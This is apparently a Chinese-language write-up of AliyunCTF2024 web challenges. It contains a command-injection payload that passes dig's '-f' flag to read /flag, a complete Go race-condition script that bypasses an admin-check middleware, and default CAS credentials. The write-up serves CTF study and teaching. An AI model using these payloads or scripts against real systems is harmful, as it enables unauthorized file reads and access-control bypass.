# AliyunCTF2024 Writeup

## writeup.ctf

### Web签到

命令注入题目，发 POST 请求时添加 `-f` 参数就能读取 `/flag`：

```json
{"domain":"a.a", "type":"-f/flag"}
```

### Pastbin

出题人基于 go1.22 原生库手搓了简易 Web 框架，但这个框架在实现路由时共用了一个底层 slice，导致 `c.mws` 可以被其他 goroutine 污染，也就是在 append 时实现数据竞争。

> 之前对 Golang 的关注点一直在怎么用来写服务上，对于框架本身研究很渣，做题的时候也是在找有没有一些逻辑漏洞，盯着中间件这些瞎看，没什么成果。后来 Baimeow 上线看 Router 部分找到了这个公用 slice，搓了个脚本打出来了 flag.

刚开始在源码里看到下面这段代码，想着是不是要选手去打 JWT，讨论之后发现走不通。

```go
// No matter what the password is, you can not log in as admin
//// I think
```

服务里有个鉴权中间件 `secureFlagMiddleware`，当用户访问 `/flag` 时会检查请求 token 里是否有 admin，如果没有会删掉返回值中的 flag 字段。然后在框架的 `Handle()` 函数中，可以发现这里有一个 `append` 操作，而 `c.mws` 在底层是被所有路由共用的：

```go{5}
// mws={[]func(http.Handler) http.Handler}

func (rtr *Router) Handle(method string, pattern string, handlers []Handler) {
    rtr.handle(method, pattern, func(resp http.ResponseWriter, req *http.Request) {
       c := rtr.m.createContext(resp, req)
       for _, h := range handlers {
          c.mws = append(c.mws, getMWFromHandler(h))
       }
       c.run()
    })
}
```

这块再结合鉴权用中间件，思路就出来了：我们可以构造三个请求，让第一个非 `/flag` 请求的后两个 Handler 被第二个 `/flag` 请求覆盖，再发第三个请求覆盖 `/flag` 的第一个 Handler 取消 adminOnly 的限制，这样就能实现绕过 `secureFlagMiddleware` 获取 flag。

之后 Baimeow 搓了个脚本：

> “触发条件比较苛刻，脚本有点讲究的，必须让最大量的流量在路由部分，且保持两类流量比例”

```go{15-35}
package main

import (
    "fmt"
    "io"
    "log"
    "net/http"
    "os"
    "strings"
)

var url = "TARGET_IP"

func main() {
    limiter1 := make(chan struct{}, 64)
    limiter2 := make(chan struct{}, 32)
    go func() {
       for {
          limiter1 <- struct{}{}
          go func() {
             if SendSlash() {
                os.Exit(0)
             }
          }()
          <-limiter1
          limiter1 <- struct{}{}
          go func() {
             if SendSlash() {
                os.Exit(0)
             }
          }()
          <-limiter1
          <-limiter2
       }
    }()
    var i = 0
    go func() {
       for {
          limiter2 <- struct{}{}
          i++
          fmt.Println("try", i)
          go func() {
             if SendFlag() {
                os.Exit(0)
             }
          }()
       }
    }()
    select {}
}

func SendSlash() bool {
    get, err := http.Get(url + "/")
    if err != nil {
       log.Println(err)
    }
    if get != nil {
       defer get.Body.Close()
       return checkBody(get.Body)
    }
    return false
}

func SendFlag() bool {
    get, err := http.Get(url + "/flag")
    if err != nil {
       log.Println(err)
    }
    if get != nil {
       defer get.Body.Close()
       return checkBody(get.Body)
    }
    return false
}

func checkBody(rd io.Reader) bool {
    data, _ := io.ReadAll(rd)
    if data == nil {
       return false
    }
    if strings.Contains(string(data), "aliyunctf{") {
       fmt.Println(string(data))
       return true
    }
    return false
}
```

可以关注下脚本中高亮的部分，是基于 channel 实现的限流器，如上文所说将 `/` 和 `/flag` 的请求比例控制在 2:1。

:::info 具体是如何控制不同请求比例的呢？

`limiter1` 和 `limiter2` 是两个无缓冲的通道，它们的容量分别为 64 和 32。这意味着这两个通道最多可以同时容纳 64 和 32 个空结构体。

当一个 goroutine 尝试向一个已满的通道发送数据时，这个 goroutine 会被阻塞，直到有其他 goroutine 从该通道接收数据，使得通道有足够的空间来存放新的数据。

同样，当一个 goroutine 尝试从一个空的通道接收数据时，这个 goroutine 也会被阻塞，直到有其他 goroutine 向该通道发送数据。

因此，这两个通道就像是两个限流器，它们限制了同时运行的 `SendSlash()` 和 `SendFlag()` 的数量。当这两个函数的数量达到通道的容量时，新的函数调用会被阻塞，直到有正在运行的函数完成。

:::

### easyCAS

> 怎么网上都是 4.X 的漏洞，版本 5.X 没漏洞了吗，可是都是六年前的了，真的没问题吗，不管了，那我就搭起来看看吧，反正没漏洞密码也懒得改了。嗷~对了，还要调一下代码，开一下调试功能。

[CAS 项目地址](https://github.com/apereo/cas )，题目环境对应版本源码：[release 5.3.16](https://github.com/apereo/cas-overlay-template/tree/5.3)，可以在本地起环境。

有了源码之后可以在配置文件中遭到默认用户密码，直接可以登进去：

```txt{7-8}
./gradlew duct
    -Pduct.cas.1=https://node1.example.org/cas \
    -Pduct.cas.2=https://node2.example.org/cas \
    -Pduct.cas.3=https://node3.example.org/cas \
    -Pduct.cas.4=https://node4.example.org/cas \
    -Pduct.service=https://apereo.github.io \
    -Pduct.username=casuser \
    -Pduct.password=Mellon
```

:::danger

Working in progress...

:::



## About.ctf

### Web 签到

搞过 Web 开发的肯定都了解 CDN。全称 Content Delivery Network，即内容分发网络，这种技术通过在全球多个地点部署服务器节点来优化内容的交付。这些节点缓存网页静态资源，使得用户可以从地理上更接近自己的位置获取这些内容，从而减少延迟，提高加载速度和用户体验。

:::tip CDN的工作原理

当用户请求特定的内容时，CDN 的 DNS 系统会将请求重定向到最近的服务器节点。这个节点会提供请求的内容，如果该节点没有缓存该内容，它会从源服务器或其他节点获取内容，然后提供给用户。这个过程减少了数据传输的距离，提高了速度和效率。

:::

在处理 CDN 时，我们就常用 `dig`，因为它可以帮助我们验证 CDN 的 DNS 配置和性能。

`dig` 本质上是个 DNS 查询工具，并不是为了 CDN 技术而开发，但它确实能帮开发者们获取 CDN 相关信息，比如查询 CDN 缓存状态、检测性能以及排查问题。

```shell
dig [server] [name] [type]
```

最简单的使用就是后面跟 domain，这里以该站点域名为例：

```shell
dig ma5hr00m.top
# --------------
; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> ma5hr00m.top
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24018
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;ma5hr00m.top.                  IN      A

;; ANSWER SECTION:
ma5hr00m.top.           600     IN      A       123.206.118.236

;; Query time: 252 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Tue May 07 20:40:39 CST 2024
;; MSG SIZE  rcvd: 5
```

其他细致用法去看 help 文档。这道题目里是利用了 `-f` 参数，当 dig 使用该参数时，可以从指定文件中读取 domain 列表并逐个查询，利用这个参数就能读取指定文件内容。

### Pastbin

Pastebin 是一种常见的在线内容托管服务，它允许用户在网站上存储（粘贴）纯文本，如代码片段，并生成一个网址。打开这个网址就可以看到对应的文字。这个服务通常用于快速共享文本或代码片段，尤其是在开发社区中非常流行。用户可以选择文本的类型（例如代码所属的编程语言）、保存时间（如 1 天、7 天、30 天或阅后即销毁等）以及分享者的昵称等信息。

> 说实话没用过，感觉这个需求直接被开发文档给吃掉了，没什么必要搞这种服务。